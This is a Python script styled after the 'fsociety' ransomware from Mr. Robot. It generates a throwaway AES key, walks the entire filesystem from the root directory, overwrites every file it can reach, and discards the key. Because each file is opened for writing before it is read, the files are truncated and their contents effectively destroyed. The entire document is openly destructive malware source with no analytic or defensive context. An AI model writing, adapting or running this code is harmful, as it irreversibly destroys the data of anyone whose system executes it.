#!/usr/bin/python3
#Built by 
import os
import time
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from random import SystemRandom
from string import ascii_letters, digits, punctuation

SALT = 'fsociety'
CS = 64 * 1024


def encrypt(file_path, key):
    if ('fuxsocy.py' not in file_path) and ('fsociety00.dat' not in file_path):
        file_size = str(os.path.getsize(file_path)).zfill(16)
        iv = Random.new().read(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        try:
            with open(file_path, 'rb') as infile:
                with open(file_path, 'wb') as outfile:
                    outfile.write(file_size.encode('utf-8'))
                    outfile.write(iv)
                    while True:
                        chunk = infile.read(CS)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))
                        outfile.write(encryptor.encrypt(chunk))
        except:
            pass


def traverse_and_encrypt(root, key):
    for directory, subdirs, files in os.walk(root):
        for file in files:
            try:
                file_path = os.path.join(directory, file)
                encrypt(file_path, key)
            except:
                pass


def gen_key(salt):
    os.urandom(16)
    print('Loading Source of Entropy')
    password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160)))) for x in range(SystemRandom().randint(80, 120)))
    update_progress(0.3)
    time.sleep(0.4)
    update_progress(0.6)
    time.sleep(0.2)
    update_progress(1)
    print()
    print('\nGenerating Keys')
    update_progress(0.3)
    hasher = SHA256.new(password.encode('utf-8'))
    key = hasher.digest()
    print('Encryption Key:', key.hex())  # Print the key as a hexadecimal string
    time.sleep(0.6)
    update_progress(0.5)
    time.sleep(0.6)
    update_progress(1)
    print()
    print()
    return key


def update_progress(progress):
    barLength = 23
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if progress >= 1:
        progress = 1
        status = "COMPLETE"
    block = int(round(barLength * progress))
    text = "\r{0}\t\t{1}".format("#" * block + " " * (barLength - block), status)
    sys.stdout.write(text)
    sys.stdout.flush()


def pwn():
    subprocess.call('clear')
    print('Executing FuxSocy')
    key = gen_key(SALT)
    print('Locating target files.')
    print('Beginning crypto operations')
    root = '/'
    traverse_and_encrypt(root, key)
    print('Encryption complete')
    del key
    exit(0)


if __name__ == '__main__':
    pwn()
